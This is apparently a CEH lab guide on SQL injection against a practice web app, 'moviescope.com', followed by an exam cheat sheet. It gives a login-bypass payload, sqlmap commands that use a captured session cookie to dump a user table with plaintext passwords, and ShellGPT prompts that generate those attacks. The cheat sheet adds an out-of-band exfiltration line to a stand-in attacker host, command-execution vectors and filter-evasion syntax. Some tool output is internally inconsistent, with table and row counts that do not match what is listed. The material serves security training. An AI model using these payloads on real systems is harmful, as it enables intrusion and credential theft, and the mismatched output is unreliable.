# Module 15: SQL Injection - Lab Guide

## Tools Used & Purpose

- **SQLMap**: Automated detection and exploitation of SQL injection vulnerabilities, database schema enumeration, and data dumping.
- **jSQL Injection**: Java-based GUI application for automated database injection, blind SQLi exploitation, and file reading.
- **Havij**: Automated SQL injection tool for testing and extracting data from vulnerable database endpoints.
- **BBQSQL**: Blind SQL injection exploitation framework for semi-blind and time-based SQL injection scenarios.
- **NoSQLMap**: Automating injection and auditing attacks against NoSQL database architectures (e.g., MongoDB, CouchDB).
- **OWASP ZAP / Burp Suite**: Intercepting web form inputs, manipulating SQL parameters, and analyzing error responses.
- **DSSS (Damn Small SQLi Scanner)**: Lightweight SQL injection vulnerability detection script.
- **ShellGPT (`sgpt`)**: Generating complex SQL injection payloads (UNION-based, boolean-blind, error-based) and parsing database dumps.

---

## 7. Hands-On Practical Labs Walkthrough

### Lab 1: Perform SQL Injection Attacks

#### Task 1: Perform an SQL Injection Attack on an MSSQL Database (Manual Exploitation)

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Target Host: Windows Server 2019 / 2022 (<code>10.10.1.22</code>).
  - Target Application: MovieScope Web Application (<code>http://www.moviescope.com</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Access Web Application Login:</b>
     - Open Firefox on Parrot Security and navigate to <code>http://www.moviescope.com</code>.
     - Click <b>Login</b> to load the authentication portal (<code>http://www.moviescope.com/login.aspx</code>).
  2. <b>Execute Manual Authentication Bypass (Tautology Attack):</b>
     - In the <b>Username</b> field, enter:
       ```sql
       ' or 1=1--
       ```
     - In the <b>Password</b> field, enter any dummy password (e.g., <code>pass</code>).
     - Click <b>Login</b>.
     - Observe successful authentication bypass: The application redirects to the authenticated member dashboard, greeting the first user in the database (admin).
  3. <b>Manually Probe Profile Parameters:</b>
     - Navigate to <code>http://www.moviescope.com/viewprofile.aspx?id=1</code>.
     - Append a single quotation mark (<code>'</code>) to the parameter: <code>id=1'</code>.
     - Observe Microsoft OLE DB Provider for SQL Server error:
       ```txt
       Unclosed quotation mark after the character string ''.
       ```
     - Confirm the parameter is directly vulnerable to in-band SQL injection.

---

#### Task 2: Perform an SQL Injection Attack against an MSSQL Database using sqlmap

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Target Host: <code>10.10.1.22</code> (<code>http://www.moviescope.com</code>).
  - Target URL: <code>http://www.moviescope.com/viewprofile.aspx?id=1</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Capture Authenticated Session Cookie:</b>
     - In Firefox, press <code>F12</code> to open Developer Tools.
     - Navigate to the <b>Storage</b> or <b>Network</b> tab and extract the active session cookies:
       ```txt
       mscope=IjWydNf8wr0-; ui-tabs-1=0
       ```
  2. <b>Enumerate Backend DBMS & Databases:</b>
     - Open Terminal on Parrot Security and execute:
       ```bash
       sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" \
              --cookie="mscope=IjWydNf8wr0-; ui-tabs-1=0" \
              --dbs
       ```
     - sqlmap identifies injection points (Boolean-blind, Error-based, UNION-query) and confirms:
       ```txt
       back-end DBMS: Microsoft SQL Server 2022
       available databases [6]:
       [*] master
       [*] model
       [*] msdb
       [*] moviescope
       [*] tempdb
       [*] ReportServer
       ```
  3. <b>Enumerate Tables in Target Database (</b><b><code>moviescope</code></b><b>):</b>
     - Execute sqlmap with <code>-D moviescope --tables</code>:
       ```bash
       sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" \
              --cookie="mscope=IjWydNf8wr0-; ui-tabs-1=0" \
              --batch -D moviescope --tables
       ```
     - sqlmap reveals database tables:
       ```txt
       Database: moviescope
       [11 tables]
       +-------------------+
       | Comments          |
       | Offices           |
       | OrderDetails      |
       | Orders            |
       | User_Login        |
       | User_Profile      |
       | tblContact        |
       +-------------------+
       ```
  4. <b>Enumerate Columns & Dump Credentials from </b><b><code>User_Login</code></b><b>:</b>
     - Execute sqlmap with <code>-D moviescope -T User_Login --dump</code>:
       ```bash
       sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" \
              --cookie="mscope=IjWydNf8wr0-; ui-tabs-1=0" \
              --batch -D moviescope -T User_Login --dump
       ```
     - sqlmap extracts all entries in plaintext/hashes:
       ```txt
       Database: moviescope
       Table: User_Login
       [5 entries]
       +-----+-------+-----------+----------+
       | UId | Uname | isAdmin   | password |
       +-----+-------+-----------+----------+
       | 1   | john  | 4         | test     |
       | 2   | katy  | true      | qwerty   |
       | 3   | Steve | true      | password |
       | 4   | lee   | NULL      | apple    |
       +-----+-------+-----------+----------+
       ```
  5. <b>Validate Harvested Credentials:</b>
     - Switch to Firefox, log out, and log in with username <code>Steve</code> and password <code>password</code>.
     - Confirm administrative access to MovieScope.

---

### Lab 2: Detect SQL Injection Vulnerabilities using OWASP ZAP

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>).
  - Target Host: <code>10.10.1.22</code> (<code>http://www.moviescope.com</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Initiate Automated Scan in OWASP ZAP:</b>
     - Launch OWASP ZAP from the Applications menu.
     - Under <b>Quick Start</b>, select <b>Automated Scan</b>.
     - Set <b>URL to attack</b> to <code>http://www.moviescope.com</code>.
     - Click <b>Attack</b>.
  2. <b>Analyze Alerts:</b>
     - ZAP spiders the website, maps endpoints, and initiates active SQL injection fuzzing.
     - In the <b>Alerts</b> tab, inspect the <b>SQL Injection</b> flag:
       - Parameter: <code>id</code> on <code>/viewprofile.aspx</code>.
       - Attack Payload: <code>' OR '1'='1' --</code>.
       - Evidence: Database error message reflected in response body.

---

### Lab 3: Perform SQL Injection using AI

#### Task 1: Perform SQL Injection using ShellGPT

- <b>Environment:</b>
  - Attacking Machine: Parrot Security (<code>10.10.1.13</code>) with ShellGPT (<code>sgpt</code>).
  - Target Host: <code>http://www.moviescope.com</code>.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Generate and Execute Database Enumeration via ShellGPT:</b>
     - In Terminal on Parrot Security, launch an interactive chat session:
       ```bash
       sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value 'mscope=IjWydNf8wr0-; ui-tabs-1=0' to enumerate database names"
       ```
     - Review generated command, press <code>[E]</code> to execute.
  2. <b>Extract Sensitive Tables via ShellGPT:</b>
     - Issue follow-up natural language prompt:
       ```bash
       sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value 'mscope=IjWydNf8wr0-; ui-tabs-1=0' and retrieve User_Login table contents from moviescope database"
       ```
     - Execute the command and observe sqlmap dumping the usernames and plaintext passwords directly into the terminal.

---

## 8. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| Root Cause of SQLi         | Web application coding flaws (lack of input validation / concatenation);|
|                            | NOT a flaw in the database software or web server engine.              |
+----------------------------+-----------------------------------------------------------------------+
| Primary Defense Against    | Parameterized Queries (Prepared Statements). Pre-compiles SQL and     |
| SQL Injection              | treats all user input strictly as literal data, never code.           |
+----------------------------+-----------------------------------------------------------------------+
| UNION Attack Prerequisites | 1. Injected SELECT must have exact same number of columns as original. |
|                            | 2. Data types of corresponding columns must be compatible.            |
+----------------------------+-----------------------------------------------------------------------+
| Column Count Discovery     | ORDER BY 1, 2, 3... until error occurs; or UNION SELECT NULL, NULL...  |
+----------------------------+-----------------------------------------------------------------------+
| In-Band vs Blind vs OOB    | In-Band uses same channel; Blind infers via True/False or Time Delay; |
|                            | Out-of-Band (OOB) uses separate protocols like DNS or HTTP.           |
+----------------------------+-----------------------------------------------------------------------+
| Out-of-Band DNS Vector     | MSSQL uses master..xp_dirtree '\\data.attacker.com\share';            |
|                            | Oracle uses UTL_INADDR.get_host_name() or UTL_HTTP.request().         |
+----------------------------+-----------------------------------------------------------------------+
| Second-Order SQLi          | Payload is stored safely in DB first; executed later when a second    |
|                            | query reads and dynamically processes the stored string.              |
+----------------------------+-----------------------------------------------------------------------+
| Time Delay Commands        | MSSQL: WAITFOR DELAY '0:0:5'; MySQL: SLEEP(5); Postgres: pg_sleep(5); |
|                            | Oracle: DBMS_PIPE.RECEIVE_MESSAGE('a', 5).                            |
+----------------------------+-----------------------------------------------------------------------+
| OS Command Execution       | MSSQL: xp_cmdshell; MySQL: INTO OUTFILE / UDF; Postgres: COPY PROGRAM.|
+----------------------------+-----------------------------------------------------------------------+
| DBMS Version Queries       | MSSQL: @@version; MySQL: version() or @@version;                      |
|                            | Oracle: SELECT banner FROM v$version; Postgres: version().            |
+----------------------------+-----------------------------------------------------------------------+
| NoSQL Injection (MongoDB)  | Uses comparison operators: $ne (not equal), $gt (greater than), and   |
|                            | JavaScript $where clause injection ($where: "this.pass == '...'").    |
+----------------------------+-----------------------------------------------------------------------+
| WAF Inline Comment Evasion | UNION/**/SELECT/**/1,2 FROM Users; replaces blocked spaces with comments|
+----------------------------+-----------------------------------------------------------------------+
```
